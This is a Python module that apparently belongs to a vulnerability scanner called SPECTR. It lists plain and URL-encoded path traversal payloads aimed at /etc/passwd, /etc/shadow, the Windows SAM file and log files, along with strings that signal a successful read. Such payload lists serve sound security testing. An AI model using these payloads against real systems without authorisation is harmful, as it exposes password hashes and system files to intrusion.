"""Path traversal payloads for SPECTR scanner"""

class PathTraversalPayloads:
    """Collection of path traversal payloads"""

    # Basic traversal payloads
    BASIC_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/group",
        "../../../proc/version",
        "..\\..\\..\\boot.ini",
        "../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../var/log/auth.log",
        "../../../var/log/syslog",
        "../../../etc/hosts",
        "..\\..\\..\\Windows\\System32\\config\\SAM",
        "../../etc/passwd%00",
        "..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\boot.ini",
        "../../../etc/hostname",
        "../../../etc/resolv.conf",
        "..\\..\\..\\..\\Windows\\win.ini",
        "../../../../etc/issue",
        "../../../etc/motd",
        "..\\..\\..\\Windows\\System32\\license.rtf"
        ]

    # Encoded payloads
    ENCODED_PAYLOADS = [
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fproc%2fversion",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fauth.log",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fsyslog",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fresolv.conf",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fmotd"
        ]

    @classmethod
    def get_all_payloads(cls):
        """Get all path traversal payloads"""
        return cls.BASIC_PAYLOADS + cls.ENCODED_PAYLOADS

    @classmethod
    def get_success_indicators(cls):
        """Get indicators that suggest successful path traversal"""
        return [
            "root:x:0:0:",
            "[boot loader]",
            "daemon:x:",
            "bin:x:",
            "processor",
            "vendor_id"
        ]
